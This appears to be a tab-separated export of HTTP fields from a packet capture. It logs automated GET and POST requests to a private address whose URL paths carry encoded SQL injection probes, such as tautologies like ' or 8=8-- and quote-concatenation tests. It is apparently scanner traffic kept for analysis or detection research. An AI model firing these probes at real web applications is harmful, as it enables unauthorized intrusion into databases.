http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																											192.168.1.104									556						1	http://192.168.1.104/0-b		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/0-b
																											192.168.1.104									558						1	http://192.168.1.104/w'%7c%7c'eb/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w'%7c%7c'eb/
																			16	16	application/x-www-form-urlencoded						192.168.1.104									562						1	http://192.168.1.104/w'%7c%7c'eb/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w'%7c%7c'eb/
																											192.168.1.104									563						1	http://192.168.1.104/w'%7c%7c'eb		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w'%7c%7c'eb
																											192.168.1.104									564						1	http://192.168.1.104/w'%2b'eb/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w'%2b'eb/
																			16	16	application/x-www-form-urlencoded						192.168.1.104									569						1	http://192.168.1.104/w'%2b'eb/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w'%2b'eb/
																											192.168.1.104									570						1	http://192.168.1.104/w'%2b'eb		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w'%2b'eb
																											192.168.1.104									572						1	http://192.168.1.104/w'%20'eb/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w'%20'eb/
																			16	16	application/x-www-form-urlencoded						192.168.1.104									575						1	http://192.168.1.104/w'%20'eb/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w'%20'eb/
																											192.168.1.104									577						1	http://192.168.1.104/w'%20'eb		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w'%20'eb
																											192.168.1.104									580						1	http://192.168.1.104/w%22%7c%7c%22eb/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w%22%7c%7c%22eb/
																			16	16	application/x-www-form-urlencoded						192.168.1.104									582						1	http://192.168.1.104/w%22%7c%7c%22eb/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w%22%7c%7c%22eb/
																											192.168.1.104									584						1	http://192.168.1.104/w'%7c%7c'eb		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w'%7c%7c'eb
																											192.168.1.104									585						1	http://192.168.1.104/w%22%2b%22eb/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w%22%2b%22eb/
																			16	16	application/x-www-form-urlencoded						192.168.1.104									589						1	http://192.168.1.104/w%22%2b%22eb/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w%22%2b%22eb/
																											192.168.1.104									592						1	http://192.168.1.104/w'%2b'eb		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w'%2b'eb
																											192.168.1.104									593						1	http://192.168.1.104/w%22%20%22eb/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w%22%20%22eb/
																			16	16	application/x-www-form-urlencoded						192.168.1.104									595						1	http://192.168.1.104/w%22%20%22eb/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w%22%20%22eb/
																											192.168.1.104									599						1	http://192.168.1.104/w'%20'eb		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w'%20'eb
																											192.168.1.104									601						1	http://192.168.1.104/webxxx'%20or%208%3d8--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%208%3d8--/
																			16	16	application/x-www-form-urlencoded						192.168.1.104									603						1	http://192.168.1.104/webxxx'%20or%208%3d8--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%208%3d8--/
																											192.168.1.104									605						1	http://192.168.1.104/w%7c%7c'eb		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w%7c%7c'eb
																											192.168.1.104									607						1	http://192.168.1.104/webxxx'%20or%207%3d5--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%207%3d5--/
																			16	16	application/x-www-form-urlencoded						192.168.1.104									610						1	http://192.168.1.104/webxxx'%20or%207%3d5--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%207%3d5--/
																											192.168.1.104									611						1	http://192.168.1.104/w%2b'eb		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w%2b'eb
																											192.168.1.104									614						1	http://192.168.1.104/webxxx'%20or%207%3d7--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%207%3d7--/
																			16	16	application/x-www-form-urlencoded						192.168.1.104									618						1	http://192.168.1.104/webxxx'%20or%207%3d7--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%207%3d7--/
																											192.168.1.104									620						1	http://192.168.1.104/w%20'eb		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/w%20'eb
																											192.168.1.104									621						1	http://192.168.1.104/webxxx'%20or%205%3d8--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%205%3d8--/
																			16	16	application/x-www-form-urlencoded						192.168.1.104									625						1	http://192.168.1.104/webxxx'%20or%205%3d8--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%205%3d8--/
																											192.168.1.104									626						1	http://192.168.1.104/webxxx'%20or%208%3d8--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%208%3d8--
																											192.168.1.104									627						1	http://192.168.1.104/webxxx'%20or%20's'%3d's/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%20's'%3d's/
																			16	16	application/x-www-form-urlencoded						192.168.1.104									632						1	http://192.168.1.104/webxxx'%20or%20's'%3d's/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%20's'%3d's/
																											192.168.1.104									633						1	http://192.168.1.104/webxxx'%20or%207%3d5--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%207%3d5--
																											192.168.1.104									635						1	http://192.168.1.104/webxxx'%20or%20's'%3d'r/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%20's'%3d'r/
																			16	16	application/x-www-form-urlencoded						192.168.1.104									637						1	http://192.168.1.104/webxxx'%20or%20's'%3d'r/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%20's'%3d'r/
																											192.168.1.104									639						1	http://192.168.1.104/webxxx'%20or%207%3d7--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%207%3d7--
																											192.168.1.104									642						1	http://192.168.1.104/webxxx'%20or%20't'%3d't/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%20't'%3d't/
																			16	16	application/x-www-form-urlencoded						192.168.1.104									645						1	http://192.168.1.104/webxxx'%20or%20't'%3d't/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%20't'%3d't/
																											192.168.1.104									648						1	http://192.168.1.104/webxxx'%20or%205%3d8--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%205%3d8--
																											192.168.1.104									649						1	http://192.168.1.104/webxxx'%20or%20't'%3d'r/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%20't'%3d'r/
																			16	16	application/x-www-form-urlencoded						192.168.1.104									651						1	http://192.168.1.104/webxxx'%20or%20't'%3d'r/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%20't'%3d'r/
																											192.168.1.104									655						1	http://192.168.1.104/webxxx'%20or%20's'%3d's		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%20's'%3d's
																											192.168.1.104									657						1	http://192.168.1.104/webxxx%22%20or%208%3d8--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%208%3d8--/
																			16	16	application/x-www-form-urlencoded						192.168.1.104									659						1	http://192.168.1.104/webxxx%22%20or%208%3d8--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%208%3d8--/
																											192.168.1.104									660						1	http://192.168.1.104/webxxx'%20or%20's'%3d'r		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%20's'%3d'r
																											192.168.1.104									664						1	http://192.168.1.104/webxxx%22%20or%207%3d5--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%207%3d5--/
																			16	16	application/x-www-form-urlencoded						192.168.1.104									666						1	http://192.168.1.104/webxxx%22%20or%207%3d5--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%207%3d5--/
																											192.168.1.104									668						1	http://192.168.1.104/webxxx'%20or%20't'%3d't		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%20't'%3d't
																											192.168.1.104									670						1	http://192.168.1.104/webxxx%22%20or%207%3d7--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%207%3d7--/
																			16	16	application/x-www-form-urlencoded						192.168.1.104									672						1	http://192.168.1.104/webxxx%22%20or%207%3d7--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%207%3d7--/
																											192.168.1.104									676						1	http://192.168.1.104/webxxx'%20or%20't'%3d'r		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx'%20or%20't'%3d'r
																											192.168.1.104									677						1	http://192.168.1.104/webxxx%22%20or%205%3d8--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%205%3d8--/
																			16	16	application/x-www-form-urlencoded						192.168.1.104									680						1	http://192.168.1.104/webxxx%22%20or%205%3d8--/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%205%3d8--/
																											192.168.1.104									683						1	http://192.168.1.104/webxxx%22%20or%208%3d8--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%208%3d8--
																											192.168.1.104									684						1	http://192.168.1.104/webxxx%22%20or%20%22s%22%3d%22s/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%20%22s%22%3d%22s/
																			16	16	application/x-www-form-urlencoded						192.168.1.104									686						1	http://192.168.1.104/webxxx%22%20or%20%22s%22%3d%22s/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%20%22s%22%3d%22s/
																											192.168.1.104									690						1	http://192.168.1.104/webxxx%22%20or%207%3d5--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%207%3d5--
																											192.168.1.104									691						1	http://192.168.1.104/webxxx%22%20or%20%22s%22%3d%22r/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%20%22s%22%3d%22r/
																			16	16	application/x-www-form-urlencoded						192.168.1.104									693						1	http://192.168.1.104/webxxx%22%20or%20%22s%22%3d%22r/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%20%22s%22%3d%22r/
																											192.168.1.104									696						1	http://192.168.1.104/webxxx%22%20or%207%3d7--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%207%3d7--
																											192.168.1.104									698						1	http://192.168.1.104/webxxx%22%20or%20%22t%22%3d%22t/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%20%22t%22%3d%22t/
																			16	16	application/x-www-form-urlencoded						192.168.1.104									702						1	http://192.168.1.104/webxxx%22%20or%20%22t%22%3d%22t/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%20%22t%22%3d%22t/
																											192.168.1.104									703						1	http://192.168.1.104/webxxx%22%20or%205%3d8--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%205%3d8--
																											192.168.1.104									705						1	http://192.168.1.104/webxxx%22%20or%20%22t%22%3d%22r/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%20%22t%22%3d%22r/
																			16	16	application/x-www-form-urlencoded						192.168.1.104									709						1	http://192.168.1.104/webxxx%22%20or%20%22t%22%3d%22r/		POST				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%20%22t%22%3d%22r/
																											192.168.1.104									711						1	http://192.168.1.104/webxxx%22%20or%20%22s%22%3d%22s		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%20%22s%22%3d%22s
																											192.168.1.104									713						1	http://192.168.1.104/21%20or%208%3d8--/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/21%20or%208%3d8--/
